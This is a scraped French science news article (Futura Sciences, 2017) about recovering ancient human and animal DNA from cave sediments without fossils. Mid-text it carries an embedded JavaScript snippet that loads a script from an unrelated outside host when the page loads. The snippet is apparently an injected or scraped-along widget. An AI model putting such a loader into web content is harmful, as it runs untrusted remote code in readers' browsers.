{"title": "L'etonnante decouverte d'ADN humain prehistorique dans le sol des cavernes", "newspaper": "Futura Sciences", "author": ["Laurent Sacco"], "date_publi": "2017-05-02", "content": "Nouvelle prouesse des paleogeneticiens : la detection d'ADN humain et animaux tres anciens dans le sol, donc en l'absence de tout fossile. C'est un nouvel outil, et de grande importance, pour la paleontologie. Ce qu'il faut retenir Une technique de metagenomique, ou << shotgun >>, permet de sequencer l'ADN mitochondrial directement dans le sol, par exemple issu de dejections animales. Ces fragments d'ADN peuvent, c'est une surprise, traverser des dizaines de millenaires. Cette technique adetecte de l'ADN de Neandertaliens et de Denisoviens dans les sediments de plusieurs grottes et permet donc etablir leur presence meme en l'absence d'os. Le biologiste suedois  Svante Paabo  monte de nouveau sur le devant de la scene de la  paleontologie  humaine avec ses collegues de l'institut Max  Planck  d'anthropologie evolutionnaire a Leipzig (Allemagne) via une publication dans  Science . Ce chercheur, specialise dans le  sequencage  du  genome  des  hominines  anciens et actuels, avait prouve, avec son equipe, le metissage entre l'Homme de  Neandertal  et  Homo sapiens  en Asie et en Europe, mais pas en Afrique. En 2010, suite a la decouverte d'un fragment de doigt et d'une dent dans une grotte des montagnes de l'Altai, dans le sud de la Siberie, Paabo avait annonce la decouverte d'un nouveau groupe d' hominides , les  Denisoviens , du nom de la grotte qui abritait ces restes de corps appartenant a une petite fille. Ce resultat provenait du  sequencage de l'ADN  mitochondrial retrouve, lequel avait de plus revele que les Denisoviens partageaient un  ancetre en commun  avec l'Homme de Neandertal. Ce parent aurait quitte l'Afrique il y a 300.000 a 400.000 ans, donnant ensuite naissance aux Neandertaliens en Europe et aux Denisoviens dans l'Altai. La grotte de Vindija, en Croatie, est connue pour la decouverte de restes de plusieurs individus neandertaliens dont un os contenant une sequence d'ADN mitochondrial complete. Sa datation directe au carbone 14 a fourni un age d'environ 38.000 ans. (c)  MPI f. Evolutionary Anthropology , J. Krause                                De l'ADN dans le sol des grottes analyse avec la methode << shotgun >> La derniere decouverte de l'equipe ne concerne pas l'histoire de l' Homme de Neandertal  et des Denisoviens. Ils presentent en fait un nouvel outil pour les archeologues qui va permettre de determiner avec plus de precision et plus de solidite l' espece  d'hominine ayant occupe un site prehistorique bien que l'on ne dispose d'aucun os fossilise.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  La datatation des couches geologiques ou la decouverte d'outils attribuables a une culture connue apporte souvent des informations dans ce genre de cas, mais, sans ossements fossilises, elles manquent de precision. Les chercheurs de l'institut Max Planck d'anthropologie evolutionnaire ont trouve une parade en utilisant une technique de sequencage connue sous le nom de  methode globale ou shotgun  (fusil a canon scie en anglais), ou  Whole Genome Shotgun (WGS),  ou encore  metagenomique  globale. Elle consiste a detecter et sequencer des traces d' ADN  non pas dans les cellules d'un organisme mais dans un milieu, comme le sol, l'eau ou la  flore intestinale . Tres efficace, elle a ete initiee par le prix Nobel de  chimie  britannique Frederick Sanger qui l'a utilisee a la fin des annees 1970 pour sequencer les premiers genomes de  virus . C'est  Craig Venter , bien connu pour ses travaux en biologie synthetique, qui en a montre la puissance pour le sequencage du genome humain. Un prelevement d'echantillon de sol sur un site archeologique espagnol. (c)  El Sidron research team                               Detecter d'anciennes presences humaines grace aux traces d'ADN Ce procede de sequencage a permis aux biologistes de confirmer une presomption. Ils savaient que des fragments d'ADN pouvaient se fixer sur certains mineraux des  sediments . Pouvaient-ils pour autant traverser les dizaines voire les centaines de milliers d'annees pour nous parvenir, attestant de la presence d'une espece humaine dans une grotte ? Et si tel etait bien le cas, pouvait-on les reperer parmi d'autres fragments d'ADN appartenant a des especes non humaines ? Pour en avoir le coeur net, les chercheurs ont donc preleve des echantillons dans sept sites archeologiques ages de 14.000 a 550.000 ans en Belgique, en Croatie, en Espagne, en France et en Russie. Douze especes de  mammiferes  ont laisse dans le sol leurs  empreintes genetiques  (plus precisement des fragments d' ADN mitochondrial , toujours present en plus grandes quantites que l'ADN nucleaire), notamment des  mammouths , des  rhinoceros  laineux, des ours et des hyenes des cavernes. De l'ADN provenant de l'Homme de Neandertal et des Denisoviens a egalement ete retrouve dans quatre des sites fouilles, majoritairement dans des couches ou n'existait aucun fragment de squelette. Pour Svante Paabo, les implications sont claires. Selon ce biologiste,  << en recuperant l'ADN d'hominines a partir des sediments, nous pouvons en detecter la presence sur des sites ou c'est impossible avec d'autres methodes. Cela montre que les analyses d'ADN dans les sediments sont une procedure archeologique tres utile, qui pourrait devenir routiniere a l'avenir >> . Un echantillon de sediments ou de l'ADN a ete recherche. (c)  MPI f. Evolutionary Anthropology , S. Tupke                               Interview 4/5 : pourquoi l'homme de Neandertal a-t-il disparu ?                       L'homme de Neandertal est un representant aujourd'hui bien connu du genre Homo. La paleoanthropologue Silvana Condemi evoque pour nous la disparition mysterieuse de cette espece.                                       ", "theme": "planete"}